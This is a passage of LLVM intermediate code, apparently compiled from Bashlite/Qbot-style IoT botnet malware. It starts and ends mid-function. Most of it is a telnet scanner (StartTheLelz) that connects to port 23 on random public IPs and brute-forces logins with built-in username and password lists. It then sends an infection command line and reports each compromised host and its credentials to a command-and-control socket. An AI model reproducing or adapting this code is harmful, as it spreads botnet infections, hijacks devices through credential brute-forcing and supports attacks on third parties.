  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #3
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @StartTheLelz() local_unnamed_addr #12 {
  %1 = alloca %struct.__sigset_t, align 8
  %2 = alloca %struct.timeval, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.timeval, align 8
  %7 = tail call i32 @getdtablesize() #3
  %8 = sdiv i32 %7, 4
  %9 = mul nsw i32 %8, 3
  %10 = icmp slt i32 %9, 512
  %11 = select i1 %10, i32 %9, i32 512
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = tail call zeroext i16 @htons(i16 zeroext 23) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %16 = bitcast i8* %15 to i64*
  store i64 0, i64* %16, align 4
  %17 = zext i32 %11 to i64
  %18 = alloca %struct.telstate_t, i64 %17, align 16
  %19 = bitcast %struct.telstate_t* %18 to i8*
  %20 = sext i32 %11 to i64
  %21 = mul nsw i64 %20, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %19, i8 0, i64 %21, i32 16, i1 false)
  %22 = icmp sgt i32 %7, 3
  br i1 %22, label %.lr.ph165.preheader, label %._crit_edge

.lr.ph165.preheader:                              ; preds = %0
  %23 = sext i32 %11 to i64
  br label %.lr.ph165

.lr.ph165:                                        ; preds = %.lr.ph165.preheader, %.lr.ph165
  %indvars.iv = phi i64 [ 0, %.lr.ph165.preheader ], [ %indvars.iv.next, %.lr.ph165 ]
  %24 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv, i32 3
  store i8 1, i8* %24, align 1
  %25 = tail call noalias i8* @malloc(i64 1024) #3
  %26 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv, i32 8
  store i8* %25, i8** %26, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %25, i8 0, i64 1024, i32 1, i1 false)
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %27 = icmp slt i64 %indvars.iv.next, %23
  br i1 %27, label %.lr.ph165, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph165
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %28 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  store i64 5, i64* %28, align 8
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  store i64 0, i64* %29, align 8
  %30 = icmp sgt i32 %7, 3
  %31 = bitcast %struct.timeval* %6 to i8*
  %32 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 0
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %2, i64 0, i32 1
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit, %._crit_edge
  br i1 %30, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %35 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %36 = getelementptr inbounds %struct.timeval, %struct.timeval* %2, i64 0, i32 0
  %37 = bitcast i32* %4 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %388
  %.1163 = phi i32 [ %.mux, %388 ], [ 0, %.lr.ph.preheader ]
  %38 = sext i32 %.1163 to i64
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38
  %40 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 2
  %41 = load i8, i8* %40, align 8
  switch i8 %41, label %388 [
    i8 0, label %42
    i8 1, label %94
    i8 2, label %143
    i8 3, label %178
    i8 4, label %201
    i8 5, label %255
    i8 6, label %278
    i8 7, label %323
    i8 8, label %333
  ]

; <label>:42:                                     ; preds = %.lr.ph
  %43 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %44 = load i8*, i8** %43, align 8
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 1024, i32 1, i1 false)
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  %46 = load i8, i8* %45, align 1
  %47 = icmp eq i8 %46, 0
  br i1 %47, label %54, label %48

; <label>:48:                                     ; preds = %42
  %49 = bitcast i8** %43 to i64*
  %50 = load i64, i64* %49, align 8
  %51 = bitcast %struct.telstate_t* %39 to i8*
  call void @llvm.memset.p0i8.i64(i8* %51, i8 0, i64 32, i32 16, i1 false)
  store i64 %50, i64* %49, align 8
  %52 = call i32 @getRandomPublicIP()
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 1
  store i32 %52, i32* %53, align 4
  br label %68

; <label>:54:                                     ; preds = %42
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 5
  %56 = load i8, i8* %55, align 1
  %57 = add i8 %56, 1
  store i8 %57, i8* %55, align 1
  %58 = icmp eq i8 %57, 26
  br i1 %58, label %59, label %63

; <label>:59:                                     ; preds = %54
  store i8 0, i8* %55, align 1
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 4
  %61 = load i8, i8* %60, align 2
  %62 = add i8 %61, 1
  store i8 %62, i8* %60, align 2
  br label %63

; <label>:63:                                     ; preds = %59, %54
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 4
  %65 = load i8, i8* %64, align 2
  %66 = icmp eq i8 %65, 19
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %63
  store i8 1, i8* %45, align 1
  br label %388

; <label>:68:                                     ; preds = %63, %48
  store i16 2, i16* %12, align 4
  store i16 %13, i16* %14, align 2
  store i64 0, i64* %16, align 4
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 1
  %70 = load i32, i32* %69, align 4
  store i32 %70, i32* %34, align 4
  %71 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  store i32 %71, i32* %72, align 16
  %73 = call i32 @setsockopt(i32 %71, i32 1, i32 20, i8* nonnull %31, i32 16) #3
  %74 = load i32, i32* %72, align 16
  %75 = call i32 @setsockopt(i32 %74, i32 1, i32 21, i8* nonnull %31, i32 16) #3
  %76 = load i32, i32* %72, align 16
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %388, label %78

; <label>:78:                                     ; preds = %68
  %79 = call i32 (i32, i32, ...) @fcntl(i32 %76, i32 3, i8* null) #3
  %80 = or i32 %79, 2048
  %81 = call i32 (i32, i32, ...) @fcntl(i32 %76, i32 4, i32 %80) #3
  %82 = load i32, i32* %72, align 16
  %83 = call i32 @connect(i32 %82, %struct.sockaddr* nonnull %35, i32 16) #3
  %84 = icmp eq i32 %83, -1
  br i1 %84, label %85, label %92

; <label>:85:                                     ; preds = %78
  %86 = tail call i32* @__errno_location() #18
  %87 = load i32, i32* %86, align 4
  %88 = icmp eq i32 %87, 115
  br i1 %88, label %92, label %89

; <label>:89:                                     ; preds = %85
  %90 = load i32, i32* %72, align 16
  %91 = call i32 @sclose(i32 %90)
  store i8 1, i8* %45, align 1
  br label %388

; <label>:92:                                     ; preds = %85, %78
  store i8 1, i8* %40, align 8
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  store i32 0, i32* %93, align 4
  br label %388

; <label>:94:                                     ; preds = %.lr.ph
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  %96 = load i32, i32* %95, align 4
  %97 = icmp eq i32 %96, 0
  br i1 %97, label %98, label %100

; <label>:98:                                     ; preds = %94
  %99 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %99, i32* %95, align 4
  br label %100

; <label>:100:                                    ; preds = %94, %98
  %101 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %32) #3, !srcloc !6
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %103 = load i32, i32* %102, align 16
  %104 = srem i32 %103, 64
  %105 = zext i32 %104 to i64
  %106 = shl i64 1, %105
  %107 = sdiv i32 %103, 64
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 %108
  %110 = load i64, i64* %109, align 8
  %111 = or i64 %106, %110
  store i64 %111, i64* %109, align 8
  store i64 0, i64* %36, align 8
  store i64 10000, i64* %33, align 8
  %112 = load i32, i32* %102, align 16
  %113 = add nsw i32 %112, 1
  %114 = call i32 @select(i32 %113, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %1, %struct.__sigset_t* null, %struct.timeval* nonnull %2) #3
  switch i32 %114, label %134 [
    i32 1, label %115
    i32 -1, label %130
  ]

; <label>:115:                                    ; preds = %100
  store i32 4, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %116 = load i32, i32* %102, align 16
  %117 = call i32 @getsockopt(i32 %116, i32 1, i32 4, i8* nonnull %37, i32* nonnull %3) #3
  %118 = load i32, i32* %4, align 4
  %119 = icmp eq i32 %118, 0
  %120 = load i32, i32* %102, align 16
  br i1 %119, label %123, label %121

; <label>:121:                                    ; preds = %115
  %122 = call i32 @sclose(i32 %120)
  br label %.sink.split

; <label>:123:                                    ; preds = %115
  %124 = call i32 (i32, i32, ...) @fcntl(i32 %120, i32 3, i8* null) #3
  %125 = and i32 %124, -2049
  %126 = call i32 (i32, i32, ...) @fcntl(i32 %120, i32 4, i32 %125) #3
  store i32 0, i32* %95, align 4
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 7
  store i16 0, i16* %127, align 16
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %129 = load i8*, i8** %128, align 8
  call void @llvm.memset.p0i8.i64(i8* %129, i8 0, i64 1024, i32 1, i1 false)
  store i8 2, i8* %40, align 8
  br label %388

; <label>:130:                                    ; preds = %100
  %131 = load i32, i32* %102, align 16
  %132 = call i32 @sclose(i32 %131)
  br label %.sink.split

.sink.split:                                      ; preds = %121, %130
  store i8 0, i8* %40, align 8
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %133, align 1
  br label %134

; <label>:134:                                    ; preds = %100, %.sink.split
  %135 = load i32, i32* %95, align 4
  %136 = add i32 %135, 5
  %137 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %138 = icmp ult i32 %136, %137
  br i1 %138, label %139, label %388

; <label>:139:                                    ; preds = %134
  %140 = load i32, i32* %102, align 16
  %141 = call i32 @sclose(i32 %140)
  store i8 0, i8* %40, align 8
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %142, align 1
  br label %388

; <label>:143:                                    ; preds = %.lr.ph
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  %145 = load i32, i32* %144, align 4
  %146 = icmp eq i32 %145, 0
  br i1 %146, label %147, label %149

; <label>:147:                                    ; preds = %143
  %148 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %148, i32* %144, align 4
  br label %149

; <label>:149:                                    ; preds = %147, %143
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %151 = load i8*, i8** %150, align 8
  %152 = call i32 @matchPrompt(i8* %151)
  %153 = icmp eq i32 %152, 0
  br i1 %153, label %155, label %154

; <label>:154:                                    ; preds = %149
  store i8 7, i8* %40, align 8
  br label %155

; <label>:155:                                    ; preds = %149, %154
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %157 = load i32, i32* %156, align 16
  %158 = load i8*, i8** %150, align 8
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 7
  %160 = load i16, i16* %159, align 16
  %161 = zext i16 %160 to i32
  %162 = call i32 @readUntil(i32 %157, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %158, i32 1024, i32 %161)
  %163 = icmp eq i32 %162, 0
  br i1 %163, label %166, label %164

; <label>:164:                                    ; preds = %155
  store i32 0, i32* %144, align 4
  store i16 0, i16* %159, align 16
  %165 = load i8*, i8** %150, align 8
  call void @llvm.memset.p0i8.i64(i8* %165, i8 0, i64 1024, i32 1, i1 false)
  store i8 3, i8* %40, align 8
  br label %388

; <label>:166:                                    ; preds = %155
  %167 = load i8*, i8** %150, align 8
  %168 = call i64 @strlen(i8* %167) #15
  %169 = trunc i64 %168 to i16
  store i16 %169, i16* %159, align 16
  %170 = load i32, i32* %144, align 4
  %171 = add i32 %170, 30
  %172 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %173 = icmp ult i32 %171, %172
  br i1 %173, label %174, label %388

; <label>:174:                                    ; preds = %166
  %175 = load i32, i32* %156, align 16
  %176 = call i32 @sclose(i32 %175)
  store i8 0, i8* %40, align 8
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %177, align 1
  br label %388

; <label>:178:                                    ; preds = %.lr.ph
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %180 = load i32, i32* %179, align 16
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 4
  %182 = load i8, i8* %181, align 2
  %183 = zext i8 %182 to i64
  %184 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %183
  %185 = load i8*, i8** %184, align 8
  %186 = call i64 @strlen(i8* %185) #15
  %187 = call i64 @send(i32 %180, i8* %185, i64 %186, i32 16384) #3
  %188 = icmp slt i64 %187, 0
  %189 = load i32, i32* %179, align 16
  br i1 %188, label %190, label %193

; <label>:190:                                    ; preds = %178
  %191 = call i32 @sclose(i32 %189)
  store i8 0, i8* %40, align 8
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %192, align 1
  br label %388

; <label>:193:                                    ; preds = %178
  %194 = call i64 @send(i32 %189, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i64 2, i32 16384) #3
  %195 = icmp slt i64 %194, 0
  br i1 %195, label %196, label %200

; <label>:196:                                    ; preds = %193
  %197 = load i32, i32* %179, align 16
  %198 = call i32 @sclose(i32 %197)
  store i8 0, i8* %40, align 8
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %199, align 1
  br label %388

; <label>:200:                                    ; preds = %193
  store i8 4, i8* %40, align 8
  br label %388

; <label>:201:                                    ; preds = %.lr.ph
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  %203 = load i32, i32* %202, align 4
  %204 = icmp eq i32 %203, 0
  br i1 %204, label %205, label %207

; <label>:205:                                    ; preds = %201
  %206 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %206, i32* %202, align 4
  br label %207

; <label>:207:                                    ; preds = %205, %201
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %209 = load i32, i32* %208, align 16
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %211 = load i8*, i8** %210, align 8
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 7
  %213 = load i16, i16* %212, align 16
  %214 = zext i16 %213 to i32
  %215 = call i32 @readUntil(i32 %209, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %211, i32 1024, i32 %214)
  %216 = icmp eq i32 %215, 0
  br i1 %216, label %236, label %217

; <label>:217:                                    ; preds = %207
  %218 = load i32, i32* @mainCommSock, align 4
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 1
  %220 = load i32, i32* %219, align 4
  %221 = call i8* @inet_ntoa(i32 %220) #3
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 4
  %223 = load i8, i8* %222, align 2
  %224 = zext i8 %223 to i64
  %225 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %224
  %226 = load i8*, i8** %225, align 8
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 5
  %228 = load i8, i8* %227, align 1
  %229 = zext i8 %228 to i64
  %230 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %229
  %231 = load i8*, i8** %230, align 8
  %232 = call i32 (i32, i8*, ...) @sockprintf(i32 %218, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.77, i64 0, i64 0), i8* %221, i8* %226, i8* %231)
  store i32 0, i32* %202, align 4
  store i16 0, i16* %212, align 16
  %233 = load i8*, i8** %210, align 8
  %234 = call i8* @strstr(i8* %233, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i64 0, i64 0)) #15
  %235 = icmp ne i8* %234, null
  %.sink = select i1 %235, i8 5, i8 7
  store i8 %.sink, i8* %40, align 8
  call void @llvm.memset.p0i8.i64(i8* %233, i8 0, i64 1024, i32 1, i1 false)
  br label %388

; <label>:236:                                    ; preds = %207
  %237 = load i8*, i8** %210, align 8
  %238 = call i8* @strstr(i8* %237, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i64 0, i64 0)) #15
  %239 = icmp eq i8* %238, null
  br i1 %239, label %244, label %240

; <label>:240:                                    ; preds = %236
  %241 = load i32, i32* %208, align 16
  %242 = call i32 @sclose(i32 %241)
  store i8 0, i8* %40, align 8
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %243, align 1
  br label %388

; <label>:244:                                    ; preds = %236
  %245 = call i64 @strlen(i8* %237) #15
  %246 = trunc i64 %245 to i16
  store i16 %246, i16* %212, align 16
  %247 = load i32, i32* %202, align 4
  %248 = add i32 %247, 8
  %249 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %250 = icmp ult i32 %248, %249
  br i1 %250, label %251, label %388

; <label>:251:                                    ; preds = %244
  %252 = load i32, i32* %208, align 16
  %253 = call i32 @sclose(i32 %252)
  store i8 0, i8* %40, align 8
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %254, align 1
  br label %388

; <label>:255:                                    ; preds = %.lr.ph
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %257 = load i32, i32* %256, align 16
  %258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 5
  %259 = load i8, i8* %258, align 1
  %260 = zext i8 %259 to i64
  %261 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %260
  %262 = load i8*, i8** %261, align 8
  %263 = call i64 @strlen(i8* %262) #15
  %264 = call i64 @send(i32 %257, i8* %262, i64 %263, i32 16384) #3
  %265 = icmp slt i64 %264, 0
  %266 = load i32, i32* %256, align 16
  br i1 %265, label %267, label %270

; <label>:267:                                    ; preds = %255
  %268 = call i32 @sclose(i32 %266)
  store i8 0, i8* %40, align 8
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %269, align 1
  br label %388

; <label>:270:                                    ; preds = %255
  %271 = call i64 @send(i32 %266, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i64 2, i32 16384) #3
  %272 = icmp slt i64 %271, 0
  br i1 %272, label %273, label %277

; <label>:273:                                    ; preds = %270
  %274 = load i32, i32* %256, align 16
  %275 = call i32 @sclose(i32 %274)
  store i8 0, i8* %40, align 8
  %276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %276, align 1
  br label %388

; <label>:277:                                    ; preds = %270
  store i8 6, i8* %40, align 8
  br label %388

; <label>:278:                                    ; preds = %.lr.ph
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  %280 = load i32, i32* %279, align 4
  %281 = icmp eq i32 %280, 0
  br i1 %281, label %282, label %284

; <label>:282:                                    ; preds = %278
  %283 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %283, i32* %279, align 4
  br label %284

; <label>:284:                                    ; preds = %282, %278
  %285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %286 = load i32, i32* %285, align 16
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %288 = load i8*, i8** %287, align 8
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 7
  %290 = load i16, i16* %289, align 16
  %291 = zext i16 %290 to i32
  %292 = call i32 @readUntil(i32 %286, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %288, i32 1024, i32 %291)
  %293 = icmp eq i32 %292, 0
  br i1 %293, label %311, label %294

; <label>:294:                                    ; preds = %284
  store i32 0, i32* %279, align 4
  store i16 0, i16* %289, align 16
  %295 = load i8*, i8** %287, align 8
  %296 = call i8* @strstr(i8* %295, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i64 0, i64 0)) #15
  %297 = icmp eq i8* %296, null
  br i1 %297, label %302, label %298

; <label>:298:                                    ; preds = %294
  call void @llvm.memset.p0i8.i64(i8* %295, i8 0, i64 1024, i32 1, i1 false)
  %299 = load i32, i32* %285, align 16
  %300 = call i32 @sclose(i32 %299)
  store i8 0, i8* %40, align 8
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %301, align 1
  br label %388

; <label>:302:                                    ; preds = %294
  %303 = call i32 @matchPrompt(i8* %295)
  %304 = icmp eq i32 %303, 0
  br i1 %304, label %305, label %309

; <label>:305:                                    ; preds = %302
  call void @llvm.memset.p0i8.i64(i8* %295, i8 0, i64 1024, i32 1, i1 false)
  %306 = load i32, i32* %285, align 16
  %307 = call i32 @sclose(i32 %306)
  store i8 0, i8* %40, align 8
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %308, align 1
  br label %388

; <label>:309:                                    ; preds = %302
  store i8 7, i8* %40, align 8
  %310 = load i8*, i8** %287, align 8
  call void @llvm.memset.p0i8.i64(i8* %310, i8 0, i64 1024, i32 1, i1 false)
  br label %388

; <label>:311:                                    ; preds = %284
  %312 = load i8*, i8** %287, align 8
  %313 = call i64 @strlen(i8* %312) #15
  %314 = trunc i64 %313 to i16
  store i16 %314, i16* %289, align 16
  %315 = load i32, i32* %279, align 4
  %316 = add i32 %315, 30
  %317 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %318 = icmp ult i32 %316, %317
  br i1 %318, label %319, label %388

; <label>:319:                                    ; preds = %311
  %320 = load i32, i32* %285, align 16
  %321 = call i32 @sclose(i32 %320)
  store i8 0, i8* %40, align 8
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %322, align 1
  br label %388

; <label>:323:                                    ; preds = %.lr.ph
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %325 = load i32, i32* %324, align 16
  %326 = call i64 @send(i32 %325, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.79, i64 0, i64 0), i64 4, i32 16384) #3
  %327 = icmp slt i64 %326, 0
  br i1 %327, label %328, label %332

; <label>:328:                                    ; preds = %323
  %329 = load i32, i32* %324, align 16
  %330 = call i32 @sclose(i32 %329)
  store i8 0, i8* %40, align 8
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %331, align 1
  br label %388

; <label>:332:                                    ; preds = %323
  store i8 8, i8* %40, align 8
  br label %388

; <label>:333:                                    ; preds = %.lr.ph
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  %335 = load i32, i32* %334, align 4
  %336 = icmp eq i32 %335, 0
  br i1 %336, label %337, label %339

; <label>:337:                                    ; preds = %333
  %338 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %338, i32* %334, align 4
  br label %339

; <label>:339:                                    ; preds = %337, %333
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %341 = load i32, i32* %340, align 16
  %342 = load i8*, i8** @infectline, align 8
  %343 = call i64 @strlen(i8* %342) #15
  %344 = call i64 @send(i32 %341, i8* %342, i64 %343, i32 16384) #3
  %345 = icmp slt i64 %344, 0
  br i1 %345, label %346, label %352

; <label>:346:                                    ; preds = %339
  %347 = load i32, i32* %340, align 16
  %348 = call i32 @sclose(i32 %347)
  store i8 0, i8* %40, align 8
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %349, align 1
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %351 = load i8*, i8** %350, align 8
  call void @llvm.memset.p0i8.i64(i8* %351, i8 0, i64 1024, i32 1, i1 false)
  br label %388

; <label>:352:                                    ; preds = %339
  %353 = load i32, i32* @mainCommSock, align 4
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 1
  %355 = load i32, i32* %354, align 4
  %356 = call i8* @inet_ntoa(i32 %355) #3
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 4
  %358 = load i8, i8* %357, align 2
  %359 = zext i8 %358 to i64
  %360 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %359
  %361 = load i8*, i8** %360, align 8
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 5
  %363 = load i8, i8* %362, align 1
  %364 = zext i8 %363 to i64
  %365 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %364
  %366 = load i8*, i8** %365, align 8
  %367 = call i32 (i32, i8*, ...) @sockprintf(i32 %353, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.80, i64 0, i64 0), i8* %356, i8* %361, i8* %366)
  %368 = load i32, i32* %334, align 4
  %369 = add i32 %368, 8
  %370 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %371 = icmp ult i32 %369, %370
  br i1 %371, label %372, label %388

; <label>:372:                                    ; preds = %352
  %373 = load i32, i32* @mainCommSock, align 4
  %374 = load i32, i32* %354, align 4
  %375 = call i8* @inet_ntoa(i32 %374) #3
  %376 = load i8, i8* %357, align 2
  %377 = zext i8 %376 to i64
  %378 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %377
  %379 = load i8*, i8** %378, align 8
  %380 = load i8, i8* %362, align 1
  %381 = zext i8 %380 to i64
  %382 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %381
  %383 = load i8*, i8** %382, align 8
  %384 = call i32 (i32, i8*, ...) @sockprintf(i32 %373, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.81, i64 0, i64 0), i8* %375, i8* %379, i8* %383)
